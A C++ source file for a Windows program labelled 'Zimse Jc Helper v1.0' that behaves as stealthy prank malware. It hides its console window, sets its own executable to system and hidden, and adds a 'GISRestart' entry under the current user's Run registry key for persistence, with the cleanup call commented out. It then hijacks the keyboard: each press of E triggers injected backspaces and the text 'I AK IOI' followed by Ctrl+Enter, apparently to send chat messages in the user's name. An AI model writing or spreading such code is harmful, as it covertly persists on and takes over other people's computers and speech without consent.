#include <iostream>
#include <cstdio>
#include <windows.h>
#include <ctime>
#include <cstdlib>
#include <dos.h>
#include <string.h>
#include <tchar.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

using namespace std;

const char Edition[128]="Zimse Jc Helper v1.0";

void AutoStart(){
    HKEY hKey;
    string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS){
        TCHAR strExeFullDir[MAX_PATH];
        GetModuleFileName(NULL, strExeFullDir, MAX_PATH);

        TCHAR strDir[MAX_PATH] = {};
        DWORD nLength = MAX_PATH;
        long result = RegGetValue(hKey, NULL, "GISRestart", RRF_RT_REG_SZ, 0, strDir, &nLength);

        if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0){
            RegSetValueEx(hKey, "GISRestart", 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1)*sizeof(TCHAR));
            RegCloseKey(hKey);
        }
    }
    return;
}

void CancelAutoStart(){
    HKEY hKey;
    string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS){
        RegDeleteValue(hKey, "GISRestart");
        RegCloseKey(hKey);
    }
    return;
}

int main(){
	HWND hwndDOS=GetForegroundWindow();
	ShowWindow(hwndDOS,SW_HIDE);
    srand(time(0));
    system("attrib jchelper.exe +s +h");
    AutoStart();
    
    while(1){
    	if(GetAsyncKeyState(0x45)){
    		keybd_event(0x08, 0, 0, 0);
			keybd_event(0x08, 0, 2, 0);
			keybd_event(0x08, 0, 0, 0);
			keybd_event(0x08, 0, 2, 0);
			keybd_event(0x08, 0, 0, 0);
			keybd_event(0x08, 0, 2, 0);
    		keybd_event(0x14, 0, 0, 0);
			keybd_event(0x14, 0, 2, 0);
			keybd_event(0x49, 0, 0, 0);
			keybd_event(0x49, 0, 2, 0);
			keybd_event(0x20, 0, 0, 0);
			keybd_event(0x20, 0, 2, 0);
			keybd_event(0x41, 0, 0, 0);
			keybd_event(0x41, 0, 2, 0);
			keybd_event(0x4B, 0, 0, 0);
			keybd_event(0x4B, 0, 2, 0);
			keybd_event(0x20, 0, 0, 0);
			keybd_event(0x20, 0, 2, 0);
			keybd_event(0x49, 0, 0, 0);
			keybd_event(0x49, 0, 2, 0);
			keybd_event(0x4F, 0, 0, 0);
			keybd_event(0x4F, 0, 2, 0);
			keybd_event(0x49, 0, 0, 0);
			keybd_event(0x49, 0, 2, 0);
			keybd_event(0x14, 0, 0, 0);
			keybd_event(0x14, 0, 2, 0);
			keybd_event(0x11, 0, 0, 0);
			keybd_event(0x0D, 0, 0, 0);
			keybd_event(0x0D, 0, 2, 0);
			keybd_event(0x11, 0, 2, 0);
			Sleep(500);
		}
	}
	
//	CancelAutoStart();
	
	MessageBox(NULL,"\n\t成功退出",Edition,MB_OK);
	system("attrib jchelper.exe -s -h");
    return 0;
}
